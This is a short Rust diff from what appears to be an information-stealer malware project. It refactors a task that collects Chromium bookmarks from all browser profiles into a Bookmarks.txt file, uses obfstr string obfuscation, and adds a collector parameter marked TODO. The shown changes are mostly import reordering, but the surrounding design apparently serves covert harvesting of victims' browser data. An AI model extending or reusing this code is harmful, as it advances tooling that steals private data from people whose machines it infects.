@@ -1,13 +1,14 @@
 use crate::alloc::borrow::ToOwned;
+use crate::chromium::BrowserData;
+use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
 use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
+use collector::atomic::AtomicCollector;
+use json::{parse, Value};
+use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
 use utils::path::Path;
-use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
-use crate::chromium::BrowserData;
-use obfstr::obfstr as s;
-use json::{parse, Value};
 
 pub(super) struct BookmarksTask {
     browser: Arc<BrowserData>
@@ -22,7 +23,8 @@ impl BookmarksTask {
 impl Task for BookmarksTask {
     parent_name!("Bookmarks.txt");
 
-    unsafe fn run(&self, parent: &Path) {
+    // TODO: Impl collector
+    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
         let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks) else {
             return
         };
